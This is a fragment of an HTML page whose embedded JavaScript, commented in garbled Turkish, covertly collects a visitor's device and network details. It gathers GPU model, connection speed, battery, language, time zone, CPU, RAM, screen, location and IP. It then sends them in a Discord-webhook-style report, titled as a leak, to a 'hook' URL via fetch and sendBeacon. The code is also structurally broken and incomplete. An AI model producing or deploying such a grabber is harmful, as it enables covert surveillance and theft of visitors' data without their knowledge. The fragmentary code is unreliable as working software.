<!DOCTYPE html>

</head>
<body>

        async function deepDiving() {

                const dbg = gl.getExtension('WEBGL_debug_renderer_info');

                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                data.net = `ðŸ“¶ **Tip:** ${conn ? conn.effectiveType : 'Bilinmiyor'}\nâš¡ **HÄ±z:** ~${conn ? conn.downlink : 'X'} Mbps\nâ±ï¸ **Ping:** ${conn ? conn.rtt : 'X'}ms`;
            } catch(e) {}

            // 3. DONANIM VE PÄ°L DETAYLARI
            try {
                const b = await navigator.getBattery();

            } catch(e) {}

            // 4. EKSTRA DERÄ°N BÄ°LGÄ°LER (Zaman Dilimi, Dil, Ä°ÅŸlemci)
            data.extra = `ðŸŒ **Dil:** ${navigator.language}\nâ° **Saat:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nðŸ§  **CPU:** ${navigator.hardwareConcurrency} Ã‡ekirdek\nðŸ’¾ **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\nðŸ“ **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth} bit)`;

            const payload = {
                embeds: [{
                    title: " ANALÄ°Z RAPORU",
                    description: "CihazÄ±n tÃ¼m donanÄ±m ve aÄŸ katmanlarÄ± sÄ±zdÄ±rÄ±ldÄ±.",
                    color: 15158332,
                    fields: [
                        { name: "ðŸŒ AÄž VE KONUM", value: `${data.loc}\n${data.net}\n**IP:** ${data.ip}`, inline: false },
                        { name: "ðŸ› ï¸ EKRAN KARTI (GPU)", value: `**Vendor:** \`${data.ven}\`\n**Renderer:** \`${data.gpu}\``, inline: false },
                        { name: "âš™ï¸ DONANIM & SÄ°STEM", value: data.extra, inline: false },
                        { name: "ðŸ”‹ GÃœÃ‡", value: data.bat, inline: true },

                    ],

            // 6. GÃ–NDERÄ°M (MUTLAK GÃœÃ‡)
            const blob = JSON.stringify(payload);
            fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
            navigator.sendBeacon(hook, blob);

            // ArayÃ¼z BitiÅŸ
